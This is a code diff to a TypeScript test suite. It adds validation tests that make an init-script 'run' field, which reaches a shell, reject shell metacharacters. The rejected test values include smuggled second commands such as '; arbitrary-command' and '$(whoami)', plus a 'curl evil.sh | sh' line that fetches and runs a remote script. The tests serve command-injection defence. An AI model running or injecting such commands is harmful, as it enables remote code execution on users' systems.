@@ -139,6 +139,13 @@ describe('package root schema exports', () => {
     expect(InitScriptSchemaOptions.safeParse(initScript.options).success).toBe(true)
     // Option keys are constrained to lowercase kebab-case flag names
     expect(InitScriptSchemaOptions.safeParse({ 'Mobile Wallet': {} }).success).toBe(false)
+    // `run` reaches a shell, so shell metacharacters are rejected rather than escaped
+    expect(InitScriptSchemaOption.safeParse({ run: 'reset-project -- --yes' }).success).toBe(true)
+    expect(InitScriptSchemaOption.safeParse({ run: 'configure --path=./src --tag=v1.2.3' }).success).toBe(true)
+    expect(InitScriptSchemaOption.safeParse({ run: 'reset-project ; arbitrary-command' }).success).toBe(false)
+    expect(InitScriptSchemaOption.safeParse({ run: 'reset-project && curl evil.sh | sh' }).success).toBe(false)
+    expect(InitScriptSchemaOption.safeParse({ run: 'reset-project $(whoami)' }).success).toBe(false)
+    expect(InitScriptSchemaOption.safeParse({ run: 'configure --title "My  App"' }).success).toBe(false)
     expect(InitScriptSchemaPackageManager.safeParse('npm').success).toBe(true)
     expect(InitScriptSchemaRename.safeParse(initScript.rename).success).toBe(true)
     expect(InitScriptSchemaSkills.safeParse(initScript.skills).success).toBe(true)
@@ -158,6 +165,7 @@ describe('package root schema exports', () => {
       group?: string
       instructions?: string[]
       rename?: InitScriptRename
+      run?: string
     }>()
     expectTypeOf<InitScriptOptions>().toEqualTypeOf<Record<string, InitScriptOption>>()
     expectTypeOf<InitScriptVersions>().toEqualTypeOf<{ adb?: string; anchor?: string; solana?: string }>()
